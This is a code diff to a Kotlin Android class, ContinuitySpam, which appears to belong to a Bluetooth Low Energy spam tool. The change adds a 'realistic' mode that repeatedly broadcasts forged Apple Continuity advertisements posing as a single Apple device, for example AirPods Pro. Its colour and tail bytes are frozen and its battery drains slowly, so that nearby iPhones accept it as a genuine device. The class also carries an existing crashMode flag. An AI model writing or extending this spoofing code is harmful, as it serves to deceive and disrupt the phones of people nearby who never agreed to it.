@@ -8,7 +8,11 @@ import java.util.concurrent.ExecutorService
 import java.util.concurrent.Executors
 
 
-class ContinuitySpam(private val type: ContinuityType, private val crashMode: Boolean = false) : Spammer {
+class ContinuitySpam(
+    private val type: ContinuityType,
+    private val crashMode: Boolean = false,
+    private val realistic: Boolean = false,
+) : Spammer {
 
     private var blinkRunnable: Runnable? = null
     @Volatile
@@ -75,6 +79,15 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
             val bluetoothAdvertiser = BluetoothAdvertiser()
             try {
                 isSpamming = true
+
+                if (realistic) {
+                    // One plausible device, held stable with slow battery drain,
+                    // instead of the model-hopping parade below. `finally` still
+                    // runs to release the radio.
+                    runRealisticDevice(bluetoothAdvertiser)
+                    return@execute
+                }
+
                 var loop = 0
 
                 // Dwell pattern: hold ONE model stable for DWELL_MS, then a
@@ -159,6 +172,51 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
         }
     }
 
+    /**
+     * "Realistic device" path: advertise ONE model as a single, coherent
+     * device. Colour and the 16-byte tail are frozen for the whole session,
+     * charging/lid are stable, and the battery drains one notch every
+     * [DRAIN_INTERVAL_MS] (recharging when low). The shared [BleSpamTx]
+     * short-circuits identical frames, so the radio only restarts on the rare
+     * battery tick — iOS sees a stable, plausible device rather than churn.
+     */
+    private fun runRealisticDevice(advertiser: BluetoothAdvertiser) {
+        if (devices.isEmpty()) return
+        val device = devices[rand.nextInt(devices.size)]
+        val deviceVal = device.value.removePrefix("0x").uppercase()
+        val color = ContinuityPayloads.pickRandomColorForDevice(deviceVal, rand)
+        val tailHex = ContinuityPayloads.randomHexBytes(16, rand)
+        val charging = 0x00 // not charging
+        val lid = 0x01      // stable lid/open counter
+
+        var batteryLevel = 7 + rand.nextInt(3) // 70–90%
+        var nextDrainAt = android.os.SystemClock.elapsedRealtime() + DRAIN_INTERVAL_MS
+
+        while (isSpamming) {
+            val now = android.os.SystemClock.elapsedRealtime()
+            if (now >= nextDrainAt) {
+                batteryLevel = if (batteryLevel <= 2) 7 + rand.nextInt(3) else batteryLevel - 1
+                nextDrainAt = now + DRAIN_INTERVAL_MS
+            }
+            val budsByte = (batteryLevel shl 4) or batteryLevel
+            val payload = ContinuityPayloads.devicePayloadStable(
+                deviceVal, color, budsByte, charging, lid, tailHex,
+            )
+            try {
+                advertiser.advertiseApple(payload)
+                blinkRunnable?.run()
+                BleSpamRuntime.trackSentPackets()
+            } catch (e: Exception) {
+                Log.w(TAG, "advertise(realistic): ${e.message}")
+            }
+            try {
+                Thread.sleep(appleDelayMs())
+            } catch (_: InterruptedException) {
+                break
+            }
+        }
+    }
+
     override fun isSpamming(): Boolean = isSpamming
 
     override fun stop() {
@@ -185,6 +243,8 @@ class ContinuitySpam(private val type: ContinuityType, private val crashMode: Bo
         private const val TAG = "ContinuitySpam"
         private const val DWELL_MS = 2_500L
         private const val GAP_MS = 500L
+        /** How often the realistic device's battery drops a notch. */
+        private const val DRAIN_INTERVAL_MS = 45_000L
 
         private val DEVICE_DATA = HashMap<String, String>().apply {
             put("0E20", "AirPods Pro")
